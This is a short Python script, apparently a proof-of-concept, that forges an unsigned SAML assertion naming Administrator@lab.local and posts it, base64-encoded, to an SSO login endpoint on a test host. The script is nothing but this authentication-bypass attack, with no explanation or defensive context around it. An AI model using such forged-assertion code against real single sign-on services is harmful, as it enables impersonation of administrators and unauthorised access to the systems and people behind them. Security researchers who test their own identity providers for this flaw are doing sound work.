import requests
import base64
assertion = '<Response><Assertion><NameID>Administrator@lab.local</NameID></Assertion></Response>'
requests.post('https://sso.example.test/ui/saml/websso/sso',
              data={'SAMLResponse': base64.encodebytes(assertion.encode())})
